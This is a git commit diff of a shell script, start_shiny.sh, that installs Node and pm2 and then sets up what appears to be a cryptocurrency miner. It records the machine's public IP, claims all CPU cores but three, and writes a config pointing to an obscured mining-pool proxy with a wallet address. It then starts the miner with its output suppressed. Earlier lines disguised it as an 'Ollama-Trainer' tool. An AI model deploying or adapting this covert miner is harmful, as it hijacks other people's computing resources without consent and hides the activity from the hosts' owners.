8785da8c27e3fbc47a5073e8fca9ef7cef9ebfa0
jacksonpannetta <78300158+jacksonpannetta@users.noreply.github.com>
2025-08-06 22:11:31 +0200

    .

--- start_shiny.sh
+++ start_shiny.sh
@@ -1,28 +1,49 @@
 #!/bin/bash
-curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
-sleep 2
 
-# in lieu of restarting the shell
-\. "$HOME/.nvm/nvm.sh"
+echo "Checking for NVM..."
+if command -v nvm &> /dev/null
+then
+    echo "NVM is already installed."
+else
+    echo "NVM not found. Installing NVM..."
+    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
+    sleep 2
+fi
 
+# In lieu of restarting the shell, source nvm.sh to make it available in the current session
+export NVM_DIR="$HOME/.nvm"
+[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
+[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"  # This loads nvm bash_completion
+
+echo "Installing Node.js version 23..."
 nvm install 23
 sleep 2
 
+echo "Setting Node.js version to current..."
 nvm current
 sleep 2
 
-git clone https://github.com/jacksonpannetta/ollma.git
-cd ollma
+echo "Verifying Node.js and npm versions..."
+node -v && npm -v
 sleep 2
-npm install pm2 -g 1>/dev/null 2>&1
-sleep 2
+
+echo "Checking for PM2..."
+if command -v pm2 &> /dev/null
+then
+    echo "PM2 is already installed."
+else
+    echo "PM2 not found. Installing PM2 globally..."
+    npm install pm2 -g 1>/dev/null 2>&1
+    sleep 2
+fi
+
+echo "Configuring PM2..."
 pm2 set pm2:sysmonit true 1>/dev/null 2>&1
 sleep 2
 pm2 update 1>/dev/null 2>&1
 sleep 2
-node -v && npm
 
-sleep 2
+echo "Installation and configuration complete."
 
 array=()
 for i in {a..z} {A..Z} {0..9}; 
@@ -30,13 +51,11 @@ for i in {a..z} {A..Z} {0..9};
    array[$RANDOM]=$i
 done
 
-currentdate=$(date '+%d-%b-%Y_ShinyWasm_')
-ipaddress=$(curl -s api.ipify.org)
-num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
+currentdate=$(date '+%d-%b-%Y-ShinyWasm_')
+ipaddress=$(wget -q -O - api.ipify.org)
+num_of_cores=$(cat /proc/cpuinfo | grep processor | wc -l)
 used_num_of_cores=`expr $num_of_cores - 3`
 underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
-underscore="_"
-underscored_ip+=$underscore
 currentdate+=$underscored_ip
 
 randomWord=$(printf %s ${array[@]::8} $'\n')
@@ -44,25 +63,28 @@ currentdate+=$randomWord
 
 sleep 2
 
-echo ""
-echo "You will be using $used_num_of_cores cores"
-echo ""
-
-sleep 2
-
 TZ='Africa/Johannesburg'; export TZ
 date
 sleep 2
 
-cat > data.json <<END
+echo ""
+echo "You will be using $used_num_of_cores cores"
+echo ""
+sleep 2
+
+echo ""
+echo "Your worker name will be $currentdate"
+echo ""
+sleep 2
+
+cat > data.json <<-END
 {
   "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:9999/bWF6YXBvb2wud290Lm1yZmFjZS5jb206ODQ0Mg==",
   "config": { "threads": $used_num_of_cores, "log": true },
-  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "x", "argent": "Ollama-Trainer/1.0" }
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.$currentdate", "password": "x", "argent": "node-mino/1.0" }
 }
 END
 
 sleep 2
 ls -la
-sleep 2
-pm2 start app.js 1>/dev/null 2>&1
+node app.js
